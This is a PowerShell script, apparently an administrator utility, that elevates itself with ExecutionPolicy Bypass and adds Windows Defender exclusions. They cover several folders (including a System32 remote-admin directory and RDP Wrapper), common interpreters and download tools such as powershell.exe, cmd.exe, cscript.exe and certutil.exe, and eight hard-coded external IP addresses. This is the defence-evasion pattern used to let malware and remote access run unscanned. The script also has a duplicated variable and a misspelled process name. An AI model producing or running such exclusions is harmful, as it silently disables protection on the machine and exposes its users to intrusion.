<#
.SYNOPSIS
    This function create new Defender Exclusions settings using 
    Add-MpPreference Commnd
.DESCRIPTION
    This script will create Tiny Defender Exclusions settings
.NOTES
    File name: NIT-TinyExclusions.ps1
    VERSION: 1.0.0a
    AUTHOR: New Internet Technologies Inc.
    Created:  2022-12-18
    Licensed under the BSD license.
    Please credit me if you find this script useful and do some cool things with it.
.VERSION HISTORY:
    1.0.0 - (2022-12-18) Script created
    1.0.1 - 
#>

### Define System Function

function Test-IsAdmin {
    try {
        $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
        $principal = New-Object Security.Principal.WindowsPrincipal -ArgumentList $identity
        return $principal.IsInRole( [Security.Principal.WindowsBuiltInRole]::Administrator )
    } catch {
        throw "Failed to determine if the current user has elevated privileges. The error was: '{0}'." -f $_
    }
}

# Code for Self Elevated Script

if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Start-Process PowerShell -Verb RunAs "-NoProfile -ExecutionPolicy Bypass -Command `"cd '$pwd'; & '$PSCommandPath';`"";
    exit;
}

# Your script here

### Set User Defined Variables
#
$aPathExclusion001="C:\ProgramData\NIT"
$aPathExclusion002="C:\.BIN"
$aPathExclusion003="C:\pub1"
$aPathExclusion004="C:\Util"
$aPathExclusion005="C:\Windows\System32\rserver30"
$aPathExclusion005="C:\Windows\sysWOW64\rserver30"
$aPathExclusion006="C:\tools"
$aPathExclusion007="C:\Program Files\RDP Wrapper"
$aPathExclusion008="C:\Python312"

$aProcExclusion001="powershell.exe"
$aProcExclusion002="RunsDownloaded.exe"
$aProcExclusion003="cmd.exe"
$aProcExclusion004="cscript.exe"
$aProcExclusion005="python.exe"
$aProcExclusion006="NSudo.exe"
$aProcExclusion007="certutil.exe"
$aProcExclusion008="perl.exe"
$aProcExclusion009="wscriptl.exe"

$anIpExclusions001="88.147.147.107"
$anIpExclusions002="93.189.41.9"
$anIpExclusions003="185.189.12.199"
$anIpExclusions004="2a04:5200:fff5::71"
$anIpExclusions005="185.195.25.56"
$anIpExclusions006="2a04:5200:fff5::a13"
$anIpExclusions007="217.107.219.81"
$anIpExclusions008="2001:1bb0:e000:1e::ff"

### Check System Conditions
#
$isAdmin = Test-IsAdmin

### Run Algorythm

if( $isAdmin ){

### === Script body === ###

	Add-MpPreference -ExclusionPath $aPathExclusion001
	Add-MpPreference -ExclusionPath $aPathExclusion002
	Add-MpPreference -ExclusionPath $aPathExclusion003
	Add-MpPreference -ExclusionPath $aPathExclusion004
    Add-MpPreference -ExclusionPath $aPathExclusion005
    Add-MpPreference -ExclusionPath $aPathExclusion006
    Add-MpPreference -ExclusionPath $aPathExclusion007
    Add-MpPreference -ExclusionPath $aPathExclusion008

	Add-MpPreference -ExclusionProcess $aProcExclusion001
    Add-MpPreference -ExclusionProcess $aProcExclusion002
    Add-MpPreference -ExclusionProcess $aProcExclusion003
    Add-MpPreference -ExclusionProcess $aProcExclusion004
    Add-MpPreference -ExclusionProcess $aProcExclusion005
    Add-MpPreference -ExclusionProcess $aProcExclusion006
    Add-MpPreference -ExclusionProcess $aProcExclusion007
    Add-MpPreference -ExclusionProcess $aProcExclusion008
    Add-MpPreference -ExclusionProcess $aProcExclusion009

    Add-MpPreference -ExclusionIpAddress $anIpExclusions001
    Add-MpPreference -ExclusionIpAddress $anIpExclusions002
    Add-MpPreference -ExclusionIpAddress $anIpExclusions003
    Add-MpPreference -ExclusionIpAddress $anIpExclusions004
    Add-MpPreference -ExclusionIpAddress $anIpExclusions005
    Add-MpPreference -ExclusionIpAddress $anIpExclusions006
    Add-MpPreference -ExclusionIpAddress $anIpExclusions007
    Add-MpPreference -ExclusionIpAddress $anIpExclusions008

### === End Script Body === ###

    Write-Host Successful Script Run!
    # return 0
}
else {
	Write-Host Warning! Script must be Run with Elevated Privileges!
	# return 17;
}
